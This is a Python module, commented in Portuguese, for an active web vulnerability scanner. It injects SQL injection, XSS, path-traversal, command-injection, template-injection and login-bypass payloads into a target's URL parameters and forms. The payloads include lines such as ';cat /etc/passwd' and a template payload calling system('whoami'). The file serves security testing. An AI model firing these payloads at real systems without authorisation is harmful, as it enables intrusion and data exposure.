"""
Scanner de Vulnerabilidades Ativas
SQLi, XSS, RCE, SSTI, LFI, Login Bypass
"""
import asyncio
import httpx
import re
import time
from typing import List, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from .models import Finding, Severity


class ActiveVulnScanner:
    """Scanner de vulnerabilidades com testes ativos"""

    # Payloads para cada vulnerabilidade
    SQLI_PAYLOADS = [
        # Boolean-based
        "' OR '1'='1",
        "' OR '1'='2",
        "') OR ('1'='1",
        "') OR ('1'='2",
        "' OR 1=1--",
        "' OR 1=2--",
        "admin'--",
        "admin' OR '1'='1",
        # Time-based
        "'; WAITFOR DELAY '00:00:05'--",
        "' AND SLEEP(5)--",
        "'; SELECT SLEEP(5)--",
        # Union-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        # Error-based
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    ]

    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "'><script>alert(1)</script>",
        '"><script>alert(1)</script>',
        "<script>alert(String.fromCharCode(49))</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<svg><script>alert(1)</script></svg>",
    ]

    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        "/etc/passwd",
        "../../windows/win.ini",
        "../../../../windows/win.ini",
        "..\\..\\..\\..\\windows\\win.ini",
        "/etc/hosts",
        "../../etc/group",
    ]

    RCE_PAYLOADS = [
        # Command injection
        ";whoami",
        "|whoami",
        ";cat /etc/passwd",
        "|cat /etc/passwd",
        ";ls -la",
        "|ls -la",
        # Time-based (comentado por ser lento)
        # ";sleep 5",
        # "|sleep 5",
        # Blind
        ";echo test123",
        "|echo test123",
        ";id",
        "|id",
    ]

    SSTI_PAYLOADS = [
        # Jinja2
        "{{7*7}}",
        "{{config}}",
        "{{request.application}}",
        # Twig
        "{{7*7}}",
        "{{_self.env}}",
        # Freemarker
        "${7*7}",
        "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd')}",
        # ERB
        "<%= 7*7 %>",
        "<%= system('whoami') %>",
        # Smarty
        "{php}echo `whoami`{/php}",
    ]

    LOGIN_BYPASS_PAYLOADS = [
        "admin' OR '1'='1",
        "admin'--",
        "admin' #",
        "' OR 1=1--",
        "' OR '1'='1'--",
        "') OR ('1'='1'--",
        "1 OR '1'='1",
        "1' OR '1'='1'/*",
        "admin",
        "admin'@a.com",
    ]

    def __init__(self, timeout: int = 30):
        self.timeout = timeout
        self.client = httpx.AsyncClient(
            timeout=timeout,
            follow_redirects=False,
            headers={
                "User-Agent": "ROOTX-Security-Scanner/1.0 (https://rootx.security)"
            }
        )

    async def close(self):
        await self.client.aclose()

    async def scan_all(self, url: str, forms: List[dict] = None) -> List[Finding]:
        """Executa todos os testes ativos"""
        findings = []

        # SQLi em parâmetros
        sqli_findings = await self._test_sqli(url)
        findings.extend(sqli_findings)

        # XSS em parâmetros
        xss_findings = await self._test_xss(url)
        findings.extend(xss_findings)

        # LFI em parâmetros
        lfi_findings = await self._test_lfi(url)
        findings.extend(lfi_findings)

        # RCE em parâmetros (só se tiver parâmetros)
        rce_findings = await self._test_rce(url)
        findings.extend(rce_findings)

        # SSTI em parâmetros
        ssti_findings = await self._test_ssti(url)
        findings.extend(ssti_findings)

        # Login Bypass em forms
        if forms:
            login_findings = await self._test_login_bypass(forms)
            findings.extend(login_findings)

        return findings

    # ==================== SQLi ====================
    async def _test_sqli(self, url: str) -> List[Finding]:
        """Testa SQL Injection"""
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return findings

        # Pega resposta original
        try:
            original_response = await self.client.get(url)
            original_text = original_response.text.lower()
        except:
            return findings

        for param_name in params.keys():
            # Testa boolean-based
            sqli_findings = await self._test_sqli_boolean(
                url, param_name, original_text, original_response.text
            )
            findings.extend(sqli_findings)

            # Testa time-based (só 1 payload por param pra não demorar)
            time_findings = await self._test_sqli_time(url, param_name)
            findings.extend(time_findings)

        return findings

    async def _test_sqli_boolean(
        self, url: str, param: str, original_content: str, original_text: str
    ) -> List[Finding]:
        """Testa SQLi boolean-based"""
        findings = []

        for payload in self.SQLI_PAYLOADS[:5]:  # Limita a 5 payloads
            try:
                # Substitui parâmetro com payload
                test_url = self._inject_param(url, param, payload)
                response = await self.client.get(test_url, timeout=10)

                # Verifica se resposta mudou significativamente
                new_text = response.text.lower()

                # Sinais de SQLi
                sql_errors = [
                    "sql syntax", "mysql", "postgresql", "sqlite",
                    "ora-00933", "ora-01789", "microsoft sql",
                    "sqlite3", "sql error", "sql syntax",
                    "sqlstate", "odbc driver", "ora-12154",
                    "warning: mysql", "error in your sql"
                ]

                for error in sql_errors:
                    if error in new_text and error not in original_text:
                        findings.append(Finding(
                            name="SQL Injection (Error-based)",
                            severity=Severity.CRITICAL,
                            description=f"Erro SQL detectado no parâmetro '{param}'",
                            location=f"{url}?{param}=...",
                            recommendation="Use prepared statements e valide inputs",
                            cve_id=None,
                            cvss=9.8
                        ))
                        return findings

                # Verifica se boolean injection funcionou
                if "1=1" in payload.lower():
                    # Resposta mudou mas não é erro
                    if abs(len(response.text) - len(original_text)) > 100:
                        findings.append(Finding(
                            name="SQL Injection (Boolean-based)",
                            severity=Severity.HIGH,
                            description=f"Possível SQLi boolean no parâmetro '{param}' - resposta mudou com payload True",
                            location=f"{url}?{param}=...",
                            recommendation="Use prepared statements e valide inputs"
                        ))
                        return findings

            except Exception:
                pass

        return findings

    async def _test_sqli_time(self, url: str, param: str) -> List[Finding]:
        """Testa SQLi time-based (simplificado para Railway)"""
        findings = []

        # Payload time-based (não bloqueia)
        payload = "';SELECT SLEEP(0)--"
        test_url = self._inject_param(url, param, payload)

        start = time.time()
        try:
            await self.client.get(test_url, timeout=5)
        except httpx.TimeoutException:
            # Timeout pode indicar sleep executou
            findings.append(Finding(
                name="SQL Injection (Possível Time-based)",
                severity=Severity.HIGH,
                description=f"Timeout ao testar time-based SQLi no parâmetro '{param}'",
                location=f"{url}?{param}=...",
                recommendation="Investigue este parâmetro manualmente com SQLMAP"
            ))
        except Exception:
            pass

        return findings

    # ==================== XSS ====================
    async def _test_xss(self, url: str) -> List[Finding]:
        """Testa XSS refletido"""
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return findings

        # Gera string única pro teste
        test_marker = "TESTXSS123456789"

        for param_name in params.keys():
            for payload in self.XSS_PAYLOADS[:3]:  # Limita a 3 payloads
                try:
                    # Substitui com payload
                    test_url = self._inject_param(url, param_name, payload)
                    response = await self.client.get(test_url, timeout=10)
                    response_text = response.text

                    # Verifica se payload está na resposta (XSS refletido)
                    if payload in response_text:
                        findings.append(Finding(
                            name="XSS Refletido",
                            severity=Severity.HIGH,
                            description=f"Payload XSS refletido no parâmetro '{param_name}'",
                            location=f"{url}?{param_name}=...",
                            recommendation="Escape e valide inputs antes de exibir"
                        ))
                        break

                except Exception:
                    pass

        return findings

    # ==================== LFI ====================
    async def _test_lfi(self, url: str) -> List[Finding]:
        """Testa Local File Inclusion"""
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return findings

        # Conteúdo esperado dos arquivos
        expected_content = {
            "passwd": "root:",  # Linux
            "win.ini": "[windows]",  # Windows
        }

        for param_name in params.keys():
            for i, payload in enumerate(self.LFI_PAYLOADS[:5]):
                try:
                    test_url = self._inject_param(url, param_name, payload)
                    response = await self.client.get(test_url, timeout=10)

                    # Verifica se conteúdo do arquivo aparece
                    for file_type, expected in expected_content.items():
                        if expected in response.text.lower():
                            findings.append(Finding(
                                name="Local File Inclusion (LFI)",
                                severity=Severity.CRITICAL,
                                description=f"Arquivo do sistema exposto via parâmetro '{param_name}'",
                                location=f"{url}?{param_name}=...",
                                recommendation="Não use includes/require com parâmetros do usuário",
                                cve_id=None,
                                cvss=9.1
                            ))
                            return findings

                except Exception:
                    pass

        return findings

    # ==================== RCE ====================
    async def _test_rce(self, url: str) -> List[Finding]:
        """Testa Remote Code Execution"""
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return findings

        marker = "ROOTXTEST" + str(time.time())[-4:]

        for param_name in params.keys():
            for payload in self.RCE_PAYLOADS[:4]:
                try:
                    # Não usa && ou || pra não causar dano
                    test_url = self._inject_param(url, param_name, payload)
                    response = await self.client.get(test_url, timeout=10)

                    # Verifica se output aparece
                    if marker not in test_url and payload in response.text:
                        findings.append(Finding(
                            name="Possível Command Injection",
                            severity=Severity.CRITICAL,
                            description=f"Comando pode ter sido executado via parâmetro '{param_name}'",
                            location=f"{url}?{param_name}=...",
                            recommendation="Nunca use eval() ou system() com inputs do usuário"
                        ))
                        return findings

                except Exception:
                    pass

        return findings

    # ==================== SSTI ====================
    async def _test_ssti(self, url: str) -> List[Finding]:
        """Testa Server Side Template Injection"""
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return findings

        # Template markers
        markers = [
            ("{{7*7}}", "49"),
            ("<%= 7*7 %>", "49"),
        ]

        for param_name in params.keys():
            for template, expected in markers[:1]:  # Só um payload
                try:
                    test_url = self._inject_param(url, param_name, template)
                    response = await self.client.get(test_url, timeout=10)

                    # Verifica se template foi processado
                    if expected in response.text:
                        findings.append(Finding(
                            name="Server Side Template Injection (SSTI)",
                            severity=Severity.CRITICAL,
                            description=f"Template engine pode estar processando parâmetros em '{param_name}'",
                            location=f"{url}?{param_name}=...",
                            recommendation="Não passe inputs do usuário para templates"
                        ))
                        return findings

                except Exception:
                    pass

        return findings

    # ==================== LOGIN BYPASS ====================
    async def _test_login_bypass(self, forms: List[dict]) -> List[Finding]:
        """Testa bypass de autenticação"""
        findings = []

        for form in forms:
            if form.get("method", "").upper() != "POST":
                continue

            for payload in self.LOGIN_BYPASS_PAYLOADS:
                try:
                    data = {
                        "username": payload,
                        "password": "test",
                    }

                    response = await self.client.post(
                        form["url"],
                        data=data,
                        timeout=10,
                        follow_redirects=True
                    )

                    # Sinais de bypass
                    success_indicators = [
                        "dashboard", "admin", "welcome", "logout",
                        "session", "token", "logged"
                    ]

                    response_lower = response.text.lower()

                    # Verifica redirect ou sessão
                    if response.status_code in [200, 302, 301]:
                        for indicator in success_indicators:
                            if indicator in response_lower:
                                # Pode ser false positive se a página tem esses textos sempre
                                if response.status_code in [302, 301] or len(response.text) > 5000:
                                    findings.append(Finding(
                                        name="Possível Login Bypass",
                                        severity=Severity.HIGH,
                                        description=f"Formulário de login pode ser bypassável com payload SQLi",
                                        location=form["url"],
                                        recommendation="Use prepared statements na query de autenticação"
                                    ))
                                    return findings

                except Exception:
                    pass

        return findings

    # ==================== HELPERS ====================
    def _inject_param(self, url: str, param: str, value: str) -> str:
        """ Injeta payload em um parâmetro"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        params[param] = [value]

        new_query = urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"


class FormDetector:
    """Detecta e analisa formulários"""

    def __init__(self, timeout: int = 30):
        self.timeout = timeout
        self.client = httpx.AsyncClient(timeout=timeout, follow_redirects=True)

    async def close(self):
        await self.client.aclose()

    async def find_forms(self, url: str) -> List[dict]:
        """Encontra formulários na página"""
        forms = []

        try:
            response = await self.client.get(url, timeout=self.timeout)
            html = response.text

            # Parse forms
            form_pattern = r'<form[^>]*>(.*?)</form>'
            for form_match in re.finditer(form_pattern, html, re.DOTALL | re.IGNORECASE):
                form_html = form_match.group(0)

                # Extrai action
                action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                action = action_match.group(1) if action_match else url
                if not action.startswith(('http://', 'https://')):
                    action = urljoin(url, action)

                # Extrai method
                method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                method = method_match.group(1).upper() if method_match else "GET"

                forms.append({
                    "url": action,
                    "method": method,
                    "has_password": "password" in form_html.lower(),
                })

        except Exception:
            pass

        return forms
